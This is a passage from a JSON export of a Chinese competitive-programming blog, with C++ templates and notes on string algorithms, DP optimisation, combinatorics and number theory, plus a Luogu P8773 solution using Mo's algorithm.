i=1;i<m;i++){\n\twhile(p>0&&b[i+1]!=b[p+1]) p=nxt[p];\n\tif(b[i+1]==b[p+1]) p++;\n\tnxt[i+1]=p;\n}\n```\n\n$nxt[i]$ 表示一直到位置i（包括i）的前缀字符串的最长公共前后缀长度  \n并且，如果 $n \\bmod (n-nxt[n])=0$ 则该字符串是由前缀长度 $n-nxt[n]$ 的子串进行若干次拼接得到的\n\n匹配\n\n```cpp\np=0;\nfor(int i=0;i<n;i++){\n\twhile(p>0&&b[p+1]!=s[i+1]) p=nxt[p];\n\tif(b[p+1]==s[i+1]) p++;\n\tif(p==m) ans++;\n}\n```\n\n## trie树\n\n### 普通trie树\n\n```cpp\nstruct Node{int w,son[62];} trie[3000006];\nint size;\ninline void put(string str){\n\tint p=0;\n\tfor(int i=0,now;i<str.size();i++){\n\t\tif(!trie[p].son[now=str[i]-'a']) trie[p].son[now]=++size;\n\t\tp=trie[p].son[now];\n\t\ttrie[p].w++;\n\t}\n}\n```\n\n### 01trie作平衡树\n\n$w[]$ 用来kth，rak操作。$num[]$ 用来存放当前节点表示的数，省去了位运算的过程\n\n有可能读入负数，需要先加上一个偏移量变成正数\n\n加入操作\n\n```cpp\nconst int off=10000000;\nint trie[10000007][2],num[10000007],w[10000007],size=1;\ninline void add(int x,int c){\n\tint p=1;\n\tx+=off;\n\tfor(int i=32,now;i>=0;i--){\n\t\tif(!trie[p][(now=((x>>i)&1))]) trie[p][now]=++size;\n\t\tp=trie[p][now];\n\t\tw[p]+=c;\n\t}\n\tnum[p]=x;\n}\n```\n\nrak操作。这个操作返回的是比给定的数小的个数。求排名还需要加一\n\n```cpp\ninline int rak(int x){\n\tint p=1,res=0;\n\tx+=off;\n\tfor(int i=32,now;i>=0;i--){\n\t\tif(now=((x>>i)&1)) res+=w[trie[p][0]];\n\t\tp=trie[p][now];\n\t}\n\treturn res;\n}\n```\n\nkth操作\n\n```cpp\ninline int kth(int k){\n\tint p=1;\n\tfor(int i=32,now;i>=0;i--){\n\t\tif(w[trie[p][0]]<k) k-=w[trie[p][0]],p=trie[p][1];\n\t\telse p=trie[p][0];\n\t}\n\treturn num[p]-off;\n}\n```\n\n**插入** `add(x,1);`\n\n**删除** `add(x,-1);`\n\n**求排名** `cout<<rak(x)+1<<endl;`\n\n**求第x小** `cout<<kth(x)<<endl;`\n\n**求前驱** `cout<<kth(rak(x))<<endl;`\n\n**求后继** `cout<<kth(rak(x+1)+1)<<endl;`\n\n## Manacher\n\n对字符串处理\n\n```cpp\n\tstr[0]='~';\n\tstr[1]='|';\n\tcnt=1;\n\tchar c=getchar();\n\twhile(c<'a'||c>'z') c=getchar();\n\twhile(c>='a'&&c<='z') str[++cnt]=c,str[++cnt]='|',c=getchar();\n```\n\n求p数组\n\n```cpp\n\tfor(int t=1,r=0,mid=0;t<=cnt;t++){\n\t\tif(t<=r) p[t]=min(p[(mid<<1)-t],r-t+1);\n\t\twhile(str[t-p[t]]==str[t+p[t]]) ++p[t];\n\t\tif(p[t]+t>r) r=p[t]+t-1,mid=t;\n\t}\n```\n\n$p[t]-1$ 才是回文串长度\n\n","summary":"noip提高级范围内的字符串相关算法知识点和模板，自用。","key":["noip","模板","字符串"],"tags":[{"value":"自用","color":"primary"}],"path":["算法竞赛","板子","noip","字符串.md"],"background":"https://www.caiwen.work/wp-content/uploads/2022/11/QQ截图20221121144547.png","recommend":false,"status":"published"},{"type":"Article","title":"动态规划的优化","id":"dp-youhua","createTime":"2022-11-21T04:38:00.000Z","updateTime":"2025-09-05T13:34:05.846Z","content":"\n## 单调队列优化多重背包\n\n先枚举物品，然后枚举余数，然后再枚举转移状态\n\n```cpp\n\tint ans=0;\n\tfor(int i=1;i<=n;i++){\n\t\tint vi,wi,si;\n\t\tcin>>vi>>wi>>si;\n\t\tif(vi==0) ans+=wi*si;//特判\n\t\tsi=min(si,v/vi);//真正可用物品数量\n\t\tfor(int d=0;d<vi;d++){//枚举余数\n\t\t\tdeque<pii> q;\n\t\t\tint k=(v-d)/vi;//可以转移的状态数量\n\t\t\tfor(int j=0;j<=k;j++){\n\t\t\t\tint now=dp[d+j*vi]-j*wi;//生成一个新状态，注意要-j*wi。后面还会加回来\n\t\t\t\twhile(!q.empty()&&now>=q.back().first) q.pop_back();\n\t\t\t\tq.push_back(pii(now,j));\n\t\t\t\twhile(!q.empty()&&q.front().second+si<j) q.pop_front();\n\t\t\t\tdp[d+j*vi]=max(dp[d+j*vi],q.front().first+j*wi);\n\t\t\t}\n\t\t}\n\t}\n\tcout<<ans+dp[v];\n```\n\n加入状态的时候 $-j\\times wi$，取出状态的时候 $+j\\times wi$\n\n## 四边形不等式优化\n\n### dp形式与结论\n\n（1） $dp[l][r]=min(dp[l][k]+dp[k+1][r])+w(l,r)$\n\n若dp方程满足四边形不等式，设 $d[l][r]$ 为 $dp[l][r]$ 的最优决策点，则有 $d[l][r-1] \\leq d[l][r] \\leq d[l+1][r]$\n\n（2） $dp[i][j]=min(dp[i-1][k])+w(k,j)$\n\n若dp方程满足四边形不等式，设 $d[i][j]$ 为 $dp[i][j]$ 的最优决策点，则有 $d[i-1][j] \\leq d[i][j] \\leq d[i][j+1]$\n\n### 使用四边形不等式优化\n\n我们需要证明 $w(i,j)$ 这个二元函数满足**区间包含单调性**和**四边形不等式**，才能说明dp满足四边形不等式\n\n1. 区间包含单调性  \n   若 $l \\leq l' \\leq r' \\leq r$ 则 $w(l',r') \\leq w(l,r)$\n\n2. 四边形不等式  \n   若 $l \\leq l' \\leq r' \\leq r$ 则 $w(l,r')+w(l',r) \\leq w(l,r)+w(l'+r')$\n\n此外还有如下结论帮助我们证明：\n\n1. 如果 $f(l,r)$ 和 $g(l,r)$ 符合四边形不等式/区间包含单调性，则对于任意 $A,B \\geq 0$ 都有 $Af(l,r)+Bg(l,r)$ 也符合四边形不等式/区间包含单调性\n\n2. 如果存在 $f(x)$ 和 $g(x)$ 使 $w(l,r)=f(r)-g(l)$ ，则 $w(l,r)$ 符合四边形恒等式（即总是等号成立的四边形不等式）。如果 $f,g$ 单调递增，那么 $w$ 还符合区间包含单调性\n\n3. 若 $h(x)$ 单调递增且下凸（$h'(x)$ 单调递增）,$w(l,r)$ 符合四边形不等式和区间包含单调性，则 $h(w(l,r))$ 也符合四边形不等式和区间包含单调性\n\n### 避免证明四边形不等式\n\n将dp最优决策点 $d[i][j]$ 数组打表，如果发现每一行、每一列都具有单调性，那么可以大胆赌一把dp满足四边形不等式\n\n## 斜率优化\n\n如果转移方程中，dp的当前位置i和准备转移到当前位置的决策点j存在形如 $g(i)*f(j)$ 的一项，那么大概率可以使用斜率优化\n\n将转移方程进行整理，由于当前dp到的位置i是固定的，因此所有与i有关的变量（除了 $dp[i]$ ）都视为常数。将含有 $j$ 的变量标记出来，将其移项，使得等式的一边只有一项带有 $j$，其余和 $j$ 有关的都移到另一边，这样我们就可以整理得到形如 $y=kx+b$ 的式子，并且我们要求的 $dp[i]$ 会在b这个位置。按题目要求，我们最大化/最小化截距。\n\n按照上面的式子，对于每个决策点，我们将其在二维平面上表示为点 $(x,y)$。然后做斜率为k的直线并进行平移，使得截距取得最值。$k$ 叫做目标斜率。要想快速得到最优决策点，我们需要维护一个凸壳。\n\n一般来说，题目要求最小值，我们维护下凸壳，求最大值，我们维护上凸壳\n\n下凸壳的点集，相邻点连线的斜率是单调递增的。下凸壳的点集，斜率则是单调递减的\n\n按照凸壳方向和目标斜率之间的关系，我们分为下面几类\n\n### 单调队列维护\n\n下凸壳，目标斜率递增；上凸壳，目标斜率递减\n\n使用单调队列维护\n\n首先我们需要找到最优决策点。这个点和上个点的斜率需要小于目标斜率，和下一个点的斜率需要大于目标斜率。不满足的点直接移出单调队列\n\n```cpp\nwhile(head<tail&&slope(que[head],que[head+1])<目标斜率) head++;\ndp[i]=...通过que[head]进行转移\n```\n\n然后准备加入新的决策点i。加入之前，还需要维护凸壳的单调性\n\n```cpp\nwhile(head<tail&&slope(que[tail],que[tail-1])>slope(que[tail],i)) tail--;\nque[++tail]=i;\n```\n\n### 单调栈维护\n\n下凸壳，目标斜率递减；上凸壳，目标斜率递增\n\n使用单调栈维护，因为我们移出一个点时只会从一个方向移出，就相当于一个单调栈\n\n同上\n\n```cpp\n#define st sta[sta.size()-1]\n#define nd sta[sta.size()-2]\nwhile(sta.size()>=2&&slope(st,nd)<目标斜率) sta.pop_back();\ndp[i]=...通过sta[st]进行转移\nwhile(sta.size()>=2&&slope(st,i)>slope(st,nd)) sta.pop_back();\nsta.push_back(i);\n```\n\n### 二分凸包\n\n当目标斜率并没有单调性时，我们就不能随意的移出凸包上的点。我们需要维护整个凸包。通过二分来查找最优决策点\n\n```cpp\nint get(int k){\n\tif(tail==head) return que[head];\n\tint l=head,r=tail,mid,ans;\n\twhile(l<=r){\n\t\tmid=(l+r)>>1;\n\t\tif(slope(que[mid],que[mid+1])<=k)){\n\t\t\tans=mid;\n\t\t\tr=mid-1;\n\t\t}else{\n\t\t\tl=mid+1;\n\t\t}\n\t}\n\treturn ans;\n}\n```\n\n转移并维护凸包\n\n```cpp\nint p=get(目标斜率);\ndp[i]=...通过p进行转移\nwhile(head<tail&&slope(que[tail],que[tail-1])>slope(que[tail],i)) tail--;\nque[++tail]=i;\n```\n\n### splay维护\n\n上述情况，决策点的横坐标总是单调递增的。但如果决策点横坐标没有单调性，则需要splay来动态维护凸包。其他还有CDQ分治和set维护动态凸包，未完待续...\n\n### 二维状态\n\n二维状态下的斜率优化和一维状态的情况类似。对于状态 $dp[x][k]$ ，其由 $dp[1...x][k-1]$ 转移过来，则可以看做一个滚动数组。\n\n首先最外层循环k，每次循环时，将单调队列清空，注意单调队列初始化方法\n\n```cpp\nhead=tail=1;\nque[head]=0;\n```\n\n其余类似于一维情况\n\n注意单调队列维护的是 $dp[..][k-1]$ 中的决策点。换句话说，$[k]$ 这一层dp的结果并不会作为这一层之后dp时的决策点，而是作为 $[k+1]$ 层的决策点。全部的决策点已经在这一层开始dp之前求好了，就差这一层dp时进行维护\n\n### 有限制的转移\n\n以`P5504 [JSOI2011] 柠檬`为例，本题转移时，要求决策点j还要满足 $s[i]=s[j]$ 的条件。我们可以将不同类的决策点放入不同的单调队列/单调栈中，dp时从满足条件的集合中选取\n\n```cpp\nvector<int> sta[100004];\n#define st sta[now][sta[now].size()-1]\n#define nd sta[now][sta[now].size()-2]\nfor(int i=1;i<=n;i++){\n\tint now=s[i];\n\t....\n}\n```\n\n值得注意的时，本题中dp到i时，i本身也可以作为一个决策点，毕竟转移方程是 $dp[i]=dp[j-1]...（j可以为i）$\n\n所以可以先加入决策点i，再选取决策点，把两个while换一下位置\n\n### 精度问题\n\n精度问题在二分凸包的类型中会凸显重要性  \n斜率用double类型表示难免会造成精度损失，因此在比较斜率时，可以把分数展开，用乘法形式，例如：\n\n```cpp\nwhile(sta[now].size()>=2&&(Y(i)-Y(st))*(X(st)-X(nd))>(Y(st)-Y(nd))*(X(i)-X(st))) sta[now].pop_back();\n```\n\n此时，不等号取登也有了意义，可以对不等号取等\n\n```cpp\nwhile(sta[now].size()>=2&&(Y(i)-Y(st))*(X(st)-X(nd))>=(Y(st)-Y(nd))*(X(i)-X(st))) sta[now].pop_back();\n```\n\n另外，需要根据单调性，确保 $(Y(i)-Y(st))$ 等是正的\n\n","summary":"单调队列优化、四边形不等式优化、斜率优化","key":["dp","单调队列","四边形不等式","斜率优化","凸包"],"tags":[],"path":["算法竞赛","知识点","动态规划的优化.md"],"background":"https://www.caiwen.work/wp-content/uploads/2022/07/17.png","recommend":false,"status":"draft"},{"type":"Article","title":"组合数学","id":"noip-zuhe","createTime":"2022-11-21T04:09:00.000Z","updateTime":"2025-09-05T13:34:05.741Z","content":"\n## 排列数\n\n**不可重排列** $A_n^r=\\frac{n!}{(n-r)!}$\n\n**圆排列** $\\frac{A_n^r}{r}$\n\n### +多重集的排列\n\n$a_1,a_2,a_3,...,a_n$ 互不相同，每个元素有无穷多个，则从中取 r 个形成排列的方案数为 $n^r$\n\n$a_1,a_2,a_3,...,a_n$ 互不相同，每个元素的个数都大于等于 r ，则从中取 r 个形成排列的方案数为 $n^r$\n\n$a_1,a_2,a_3,...,a_n$ 互不相同，每个元素的个数都比 r 小。设 $k_1,k_2,k_3,...,k_n$ 为 $a_1,a_2,a_3,...,a_n$ 的个数，则从中取 r 个形成排列的方案数为 $\\frac{(k_1+k_2+K_3+...+k_n)!}{k_1!k_2!k_3!...k_n!}$\n\n$a_1,a_2,a_3,...,a_n$ 互不相同，至少有一个元素的个数比 r 小。设 $k_1,k_2,k_3,...,k_n$ 为 $a_1,a_2,a_3,...,a_n$ 的个数，则从中取 r 个形成排列的方案数为 $r\\times \\frac{r!}{k_1!k_2!...k_n!}$\n\n## 组合数\n\n**不可重组合** $C_n^r=\\frac{n!}{r!(n-r)!}$\n\n**不相邻组合** $C_{n-r+1}^r$\n\n### +多重集的组合\n\n$a_1,a_2,a_3,...,a_n$ 互不相同，每个元素有无穷多个，则从中取 r 个的方案数为 $C_{n+r-1}^r$\n\n$a_1,a_2,a_3,...,a_n$ 互不相同，每个元素的个数都大于等于 r ，则从中取 r 个的方案数为 $C_{n+r-1}^r$\n\n### +常用公式\n\n$C_n^r=C_n^{n-r}$\n\n**帕斯卡恒等式** $C_n^r=C_{n-1}^r+C_{n-1}^{r-1}$\n\n**二项式定理** $(x+y)^n=\\sum_{i=0}^{n}C_n^ix^{n-i}y^i$\n\n$\\sum_{i=0}^{n}C_n^i=2^n$\n\n$C_n^0+C_n^2+C_n^4+C_n^6...=C_n^1+C_n^3+C_n^5+C_n^7...$\n\n$\\sum_{i=0}^{n}2^iC_n^i=3^n$\n\n**Lucas定理推论** $C_n^r$ 为奇数，则\n\n![](https://www.caiwen.work/wp-content/uploads/2022/11/QQ截图20221121111005.png)\n\n## 错排\n\nn 个元素的错排方案数记为 $D_n$\n\n则有 $D_1=0,D_2=1$\n\n$D_n=(n-1)(D_{n-1}+D_{n-2})$\n\n## 斐波那契数列\n\n$F_1=F_2=1$  \n$F_n=F_{n-1}+F_{n-2}$\n\n## 卡特兰数\n\n**组合数** $Cat_n=C_{2n}^n-C_{2n}^{n-1}$\n\n**递推** $Cat_{n+1}=\\frac{2(2n+1)}{n+2}Cat_n$\n\n### +应用\n\n- n 个数有 $Cat_n$ 种出栈顺序\n\n- n 个节点的二叉树有 $Cat_n$ 种构型\n\n- n+1 个节点的满二叉树有 $Cat_n$ 种\n\n- 在 $n\\times n$ 的格子的右下三角形中行走，每次横走或竖走，有 $Cat_n$ 种走法\n\n- 将 n+2 边形剖分成三角形，有 $Cat_n$ 种方案\n\n- 有 n 个左括号和右括号的合法括号表达式有 $Cat_n$ 种\n\n## 第一类斯特林数\n\n$S_1[n][m]$ 表示把 n 个不同的元素排列成 m 个圆排列的方案数  \n有 $S_1[n][m]=S_1[n-1][m]\\times (n-1)+S_1[n-1][m-1]$\n\n边界 $S_1[0][0]=1$\n\n## 第二类斯特林数\n\n$S_2[n][m]$ 表示把 n 个不同的小球放到 m 个相同盒子，且每个盒子不为空的方案数\n\n有 $S_2[n][m]=S_2[n-1][m]\\times m+S_2[n-1][m-1]$  \n边界 $S_2[0][1]=1$\n\n## 贝尔数\n\n$B_n$ 表示把 n 个不同元素划分为若干个非空集合的方案数\n\n**递推公式** $B_{n+1}=\\sum_{i=0}^{n}C_n^iB_i$\n\n**借助第二类斯特林数** $B_n=\\sum_{i=0}^{n} S_2[n][i]$\n\n## 盒子与球模型\n\nn 个盒子，r 个球\n\n### 球不同盒不同有空盒\n\n每个球之间相互独立，自行选择在哪一个盒子\n\n方案数为 $n^r$\n\n### 球相同盒不同\n\n每个球相同，用隔板法\n\n**没有空盒**\n\n方案数为 $C_{r-1}^{n-1}$\n\n**有空盒**\n\n提前向每个盒子中放入一个球，再做没有空盒的情况\n\n方案数为 $C_{r+n-1}^{n-1}$\n\n### 球相同盒相同\n\n考虑dp\n\n**有空盒**\n\n$dp[r][n]$ 表示将 r 个小球放到 n 个盒子中，允许空盒的方案数  \n边界 $dp[0][...]=1,dp[...][1]=1$\n\n转移，对于 $dp[i][j]$\n\n如果 $i<j$，$dp[i][j]=dp[i][i]$；\n\n如果 $i>=j$，$dp[i][j]=dp[i-j][j]+dp[i][j-1]$\n\n**没有空盒**\n\n先在每个盒子里都放上一个球\n\n方案数为 $dp[r-n][n]$\n\n### 球不同盒相同\n\n考虑第二类斯特林数\n\n**没有空盒**\n\n方案数为 $S_2[r][n]$\n\n**有空盒**\n\n枚举有几个盒子为空\n\n方案数为 $\\sum_{i=1}^{n} S_2[r][n-i]$\n\n### 球不同盒不同没空盒\n\n在盒相同的基础上对盒做一个全排列\n\n方案数为 $n!\\times S_2[r][n]$\n\n## 组合数取模\n\n$m,n\\le 1000$ 使用帕斯卡恒等式递推\n\nmod 较大时，使用线性推阶乘逆元\n\nmod 比较小时，使用Lucas定理\n\n### Lucas定理\n\n需要借助线性推阶乘逆元\n\n```cpp\ninline int c(int n,int m,int mod){return m>n? 0:fac[n]*inv[m]%mod*inv[n-m]%mod;}\n```\n\n注意lucas的边界\n\n```cpp\nint lucas(int n,int m,int p){return m? c(n%p,m%p,p)*lucas(n/p,m/p,p):1;}\n```\n\n","summary":"noip提高级范围内的组合数学知识点和模板，自用。","key":["noip","模板","组合数学"],"tags":[{"value":"自用","color":"primary"}],"path":["算法竞赛","板子","noip","组合数学.md"],"background":"https://www.caiwen.work/wp-content/uploads/2022/08/QQ截图20220814090142.png","recommend":false,"status":"published"},{"type":"Article","title":"数论","id":"noip-shulun","createTime":"2022-11-21T02:12:00.000Z","updateTime":"2025-09-05T13:34:05.678Z","content":"\n## 质数\n\n### 一些结论\n\n**质数分布** $\\pi (x)$为不大于x的质数的个数，有 $\\pi (x)\\approx \\frac{x}{\\ln\\_{}{x} } $\n\n**质数近似估计** 第x个质数的近似估计：$x\\ln_{}{x}$\n\n### 欧拉筛\n\n时间复杂度为 $O(n \\log n \\log n)$\n\n### 线性筛\n\n```cpp\nvoid pre(int n){\n\tfor(int i=2;i<=n;i++){\n\t\tif(!vis[i]) prime[++cnt]=i;\n\t\tfor(int j=1;j<=cnt&&prime[j]*i<=n;j++){\n\t\t\tvis[prime[j]*i]=true;\n\t\t\tif(i%prime[j]==0) break;\n\t\t}\n\t}\n}\n```\n\n### 分解质因数\n\n#### 法一\n\n如果被分解的数不太大，可以使用线性筛筛出小于等于它的所有质数。枚举每个质数，再一个一个试除\n\n#### 法二\n\n事实上，即使被分解的数到了 $10^{12}$ 的范围，也是可以用上述方法的\n\n考虑到原数只可能有一个大于 $\\sqrt{n}$ 的质因子，所以我们只需要筛出 $\\sqrt{n}$ 以内的质数，然后再一个个试除\n\n除到最后如果不为1的话，那么剩下那个数就是原数最后的质因子\n\n#### 法三\n\n在线性筛时，vis数组不单纯记录有没有被筛掉，而是记录被哪个数字筛掉了。最后根据vis数组就可以做到分解质因数\n\n```cpp\nint prime[_],cnt,vis[_];\ninline void init(int n){\n\tfor(int i=2;i<=n;i++){\n\t\tif(!vis[i]) prime[++cnt]=i,vis[i]=i;\n\t\tfor(int j=1;j<=cnt&&prime[j]*i<=n;j++){\n\t\t\tvis[prime[j]*i]=prime[j];\n\t\t\tif(i%prime[j]==0) break;\n\t\t}\n\t}\n}\n```\n\n```cpp\nwhile(t--){\n\tint x;cin>>x;\n\tint ans=0;\n\twhile(x!=1){\n\t\tans^=vis[x];\n\t\tx/=vis[x];\n\t}\n\tcout<<ans<<endl;\n}\n```\n\n## 约数\n\n### 一些结论\n\n将正整数N分解为 $N=p_1^{c_1}p_2^{c_2}p_3^{c_3}...p_m^{c_m}$  \n则有：\n\n**N的正约数的个数为** $\\prod_{i=1}^{m} (c_i+1)$\n\n**N的所有正约数之和为** $\\prod_{i=1}^{m} (\\sum_{j=0}^{c_i}(p_i)^j )$\n\n$lcm(ma,mb)=m\\times lcm(a,b)$\n\n$a\\times b=gcd(a,b)\\times lcm(a,b)$\n\n**欧几里得算法** $gcd(a,b)=gcd(b,a \\bmod b)$\n\n**更相减损术** $gcd(a,b)=gcd(a,a-b)=gcd(b,a-b)$ $(a\\ge b)$\n\n**高精度求gcd**\n\n若a和b均为偶数，$gcd(a,b)=2\\times gcd(a/2,b/2)$；\n\n若a为偶数b为奇数，$gcd(a,b)=gcd(a/2,b)$；\n\n若a和b均为奇数，$gcd(a,b)=gcd(a-b,b)$\n\n## 同余\n\n### 一些结论\n\n**费马小定理**\n\n若 $a,p$ 互质且 $p$ 为质数，则有 $a^{p-1}\\equiv 1\\pmod{p}$  \n进一步推得 $a^b \\equiv a^{bmod(p-1)}\\pmod{p}$\n\n**扩展欧拉定理**\n\n对于任意 $a,m$ 都有\n![](https://www.caiwen.work/wp-content/uploads/2022/11/QQ截图20221121101916.png)\n\n### exgcd\n\n```cpp\nint exgcd(int a,int b,int &x,int &y){\n\tif(!b){return x=1,y=0,a;\n\tint r=exgcd(b,a%b,y,x);\n\ty-=a/b*x;\n\treturn r;\n}\n```\n\n$exgcd(a,b,x,y)$ 即可求出方程 $ax+by=gcd(x,y)$ 一组特解 $x,y$\n\n求出解的增量： $dx=b/gcd(a,b),dy=a/gcd(a,b)$\n\n与原方程的倍数： $d=c/gcd(a,b)$\n\n得原方程的特解： $x\\ast =d,y\\ast =d$\n\n然后可以利用增量来调整解\n\n比如，若 $x<0$ 则可以 $x\\bmod dx+dx$ 来调整到x的最小**非负**整数解\n\n### excrt\n\n```cpp\nint excrt(){\n\tint M=m[1],A=a[1],x,y,d;\n\tfor(int i=1;i<=n;i++){\n\t\td=exgcd(M,m[i],x,y);\n\t\tif((A-a[i])%d!=0) return -1;\n\t\tx=((A-a[i])/d*x%(m[i]/d)+m[i]/d)%(m[i]/d);//可能这一步需要龟速乘\n\t\tA-=x*M;\n\t\tM=M/d*m[i];\n\t\tA=(A%M+M)%M;\n\t}\n\treturn A;\n}\n```\n\n### 逆元\n\n#### exgcd求逆元\n\n```cpp\nint b,p,x,y;\nexgcd(b,p,x,y);\nx=(x%p+p)%p;\n```\n\nx即为b在模p下的逆元\n\n时间复杂度 $O(log n)$\n\n#### 费马小定理求逆元\n\n**要求p必须为质数**\n\n```cpp\nint x=qpow(b,p-2,p);\n```\n\nx即为b在模p下的逆元\n\n时间复杂度 $O(log n)$\n\n#### 线性推连续逆元\n\n```cpp\nint n,p;\ninv[0]=0,inv[1]=1;\nfor(int i=2;i<=n;i++){\n  inv[i]=p-(p/i)*inv[p%i]%p;\n}\n```\n\n时间复杂度 $O(n)$\n\n#### 线性推阶乘逆元\n\n**常用于组合数取模**\n\n```cpp\nconst int mod;\nint fac[1000006];\nint inv[1000006];\nvoid pre(){\n\tfac[0]=1;\n\tfor(int i=1;i<=n;i++) fac[i]=fac[i-1]*i%mod;\n\tinv[n]=pow(fac[n],mod-2);\n\tfor(int i=n-1;i>=0;i--){\n\t\tinv[i]=inv[i+1]*(i+1)%mod;\n\t}\n}\n```\n\n时间复杂度 $O(n)$\n\n#### 线性推数列逆元\n\n借助线性推乘法逆元的思想\n\n对于数列 $a_1,a_2,a_3...,a_n$\n\n定义 `f[i]=f[i-1]*a_i%mod;`\n\n先求最后一项的逆元 `g[n]=qpow(f[n],mod-2);`\n\n然后线性推 `g[i]=g[i+1]*a[i+1]%mod;`\n\n则对于 $a_i$ 的逆元，为 `g[i]*f[i-1]%mod`\n\n## 其他\n\n### 矩阵快速幂\n\n1. 生成单位矩阵的时候只需要一层循环\n\n2. Matrix结构体的arr数组记得要memset\n\n3. 看好数据范围，可能需要龟速乘\n\n### 欧拉函数\n\n#### 一些结论\n\n$n= {\\textstyle \\sum\\_{d|n}^{}}\\varphi (d) $\n\n除了2以外，其他数的欧拉函数值都为偶数\n\n$\\varphi(p^k)=p^k-p^{k-1}$\n\n如果 $gcd(a,x)=1$ 那么 $gcd(x-a,a)$。因此，与x互质的数是成对出现的，并且和为x。由此可知，小于n与n互质的所数的和为 $\\varphi(n)\\times n/2$\n\n#### 暴力推欧拉函数\n\n```cpp\ninline int euler(int x){\n\tint phi=x;\n\tfor(int i=2;i*i<=x;i++){\n\t\tif(x%i==0) phi=phi/i*(i-1);///\n\t\twhile(x%i==0) x/=i;\n\t}\n\tif(x>1) phi=phi/x*(x-1);\n\treturn phi;\n}\n```\n\n#### 线性筛欧拉函数\n\n```cpp\nint phi[_],vis[_],prime[_],cnt;\nvoid pre(){\n\tphi[1]=1;///\n\tfor(int i=2;i<=_-6;i++){\n\t\tif(!vis[i]) prime[++cnt]=i,phi[i]=i-1;\n\t\tfor(int j=1;j<=cnt&&i*prime[j]<=_-6;j++){\n\t\t\tvis[i*prime[j]]=true;\n\t\t\tif(i%prime[j]==0){\n\t\t\t\tphi[i*prime[j]]=phi[i]*prime[j];///\n\t\t\t\tbreak;\n\t\t\t}else{\n\t\t\t\tphi[i*prime[j]]=phi[i]*phi[prime[j]];///\n\t\t\t}\n\t\t}\n\t}\n}\n```\n\n### 数论分块\n\n用于求 $\\sum_{i=1}^{n}\\frac{x}{i}$\n\n我们发现一些 $\\frac{x}{i}$ 的值是相同的，将相同的作为一个块\n\n设 $t=\\frac{x}{i}$ 为当前块的特征值（也就是当前块所有的数都等于这个）\n\n如果 $t=0$ ，那么当前块的右边界为n\n\n如果 $t\\neq 0$ ，那么当前块的右边界为 $\\frac{n}{t}$\n\n","summary":"noip提高级范围内的数论算法知识点和模板，自用。","key":["noip","模板","数论"],"tags":[{"value":"自用","color":"primary"}],"path":["算法竞赛","板子","noip","数论.md"],"background":"https://www.caiwen.work/wp-content/uploads/2022/11/QQ截图20221121122542.png","recommend":false,"status":"published"},{"type":"Article","title":"P8773 [蓝桥杯 2022 省 A] 选数异或","id":"p8773","createTime":"2022-11-11T12:42:00.000Z","updateTime":"2025-09-05T13:34:05.792Z","content":"\n::: success 说明\n本文作为洛谷P8773 [蓝桥杯 2022 省 A] 选数异或的题解[^1]的题解，已经在洛谷发布。\n\nhttps://www.luogu.com.cn/problem/solution/P8773\n\n[^1]: P8773 [蓝桥杯 2022 省 A] 选数异或 https://www.luogu.com.cn/problem/P8773\n\n:::\n\n竟然没有题解，那么本蒟蒻就随手写一个......\n\n首先有一个很常见的结论： 如果 $a \\otimes b=x$ 那么 $a \\otimes x=b$ 。\n\n根据这个结论，我们可以对 $A$ 数列中每一项异或上一个数 $x$ 得到 $B$ 数列。即： `b[i]=a[i]^x;` 。\n\n然后题意就转化为：给定一个区间 $[l,r]$ ，问数组 $a$ 和数组 $b$ 在这个区间内是否有相同的数。\n\n这个问题看起来很简单，应该有非常简单又巧妙的解法。但是本蒟蒻一眼就想拿莫队来做，是目前的最**劣**解。\n\n先离散化，再开两个桶，每次移动指针的时候判断是否影响答案。\n\n时间复杂度：$O(n \\log n+n\\sqrt{n})$ （不知道对不对）。\n\n代码：\n\n```cpp\n#include<iostream>\n#include<algorithm>\n#include<cmath>\n#define int long long\n#define _ 100005\nusing namespace std;\n\nint blo,bl[_],a[_],b[_],uni[_<<1],tot,n,m,x;\nstruct Query{int l,r,id,ans;} q[_];\n\n//注意开两倍数组\nint l=1,r,ans,bu1[_<<1],bu2[_<<1];\ninline void add(int x){\n\tbool st=((bu1[a[x]]>0&&bu2[a[x]]>0)||(bu1[b[x]]>0&&bu2[b[x]]));\n\tbu1[a[x]]++;\n\tbu2[b[x]]++;\n\tbool ed=((bu1[a[x]]>0&&bu2[a[x]]>0)||(bu1[b[x]]>0&&bu2[b[x]]));\n\tif(!st&&ed) ans++;//判断是否对答案产生影响\n}\ninline void del(int x){\n\tbool st=((bu1[a[x]]>0&&bu2[a[x]]>0)||(bu1[b[x]]>0&&bu2[b[x]]));\n\tbu1[a[x]]--;\n\tbu2[b[x]]--;\n\tbool ed=((bu1[a[x]]>0&&bu2[a[x]]>0)||(bu1[b[x]]>0&&bu2[b[x]]));\n\tif(st&&!ed) ans--;\n}\n\nsigned main(){\n\tios::sync_with_stdio(false);\n\t//读入数据\n\tcin>>n>>m>>x;\n\tfor(int i=1;i<=n;i++) cin>>a[i],b[i]=a[i]^x,uni[++tot]=a[i],uni[++tot]=b[i];\n\tfor(int i=1;i<=m;i++) cin>>q[i].l>>q[i].r,q[i].id=i;\n\t//离散化\n\tsort(uni+1,uni+tot+1);\n\ttot=unique(uni+1,uni+tot+1)-uni-1;\n\tfor(int i=1;i<=n;i++) a[i]=lower_bound(uni+1,uni+tot+1,a[i])-uni,b[i]=lower_bound(uni+1,uni+tot+1,b[i])-uni;\n\t//分块\n\tblo=sqrt(n);\n\tfor(int i=1;i<=n;i++) bl[i]=(i-1)/blo+1;\n\tsort(q+1,q+m+1,[](Query qa,Query qb){return bl[qa.l]==bl[qb.l]? qa.r<qb.r:qa.l<qb.l;});\n\t//处理询问\n\tfor(int i=1;i<=m;i++){\n\t\twhile(l<q[i].l) del(l++);\n\t\twhile(l>q[i].l) add(--l);\n\t\twhile(r<q[i].r) add(++r);\n\t\twhile(r>q[i].r) del(r--);\n\t\tq[i].ans=ans;\n\t}\n\t//输出答案\n\tsort(q+1,q+m+1,[](Query qa,Query qb){return qa.id<qb.id;});\n\tfor(int i=1;i<=m;i++) cout<<(q[i].ans? \"yes\":\"no\")<<endl;\n\treturn 0;\n}\n```\n\n","summary":"P8773 [蓝桥杯 2022 省 A] 选数异或的题解","key":["题解","p8773","莫队","异或"],"tags":[],"path":["算法竞赛","题解","P8773 [蓝桥杯 2022 省 A] 选数异或.md"],"background":"https://pic.caiwen.work/i/2025/01/22/67909e51b8f1c.jpg","recommend":false,"status":"published"},{"type":"Article","title":"CZOI2023题解","id":"czoi2023-tijie","createTime":"2022-11-03T13:04:00.000Z","updateTime":"2025-09-05T13:34:06.345Z","content":"\n::: success 